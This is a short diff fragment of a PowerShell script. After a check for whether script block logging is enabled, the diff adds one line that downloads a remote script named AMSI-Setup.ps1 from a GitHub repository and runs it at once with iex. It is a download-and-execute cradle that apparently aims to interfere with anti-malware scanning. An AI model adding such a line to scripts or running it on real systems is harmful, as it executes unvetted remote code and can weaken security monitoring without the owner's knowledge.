@@ -38,3 +38,4 @@ catch
 	    Write-host "Script block logging not enabled"
 }
 
+iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/AMSI-Setup.ps1'))
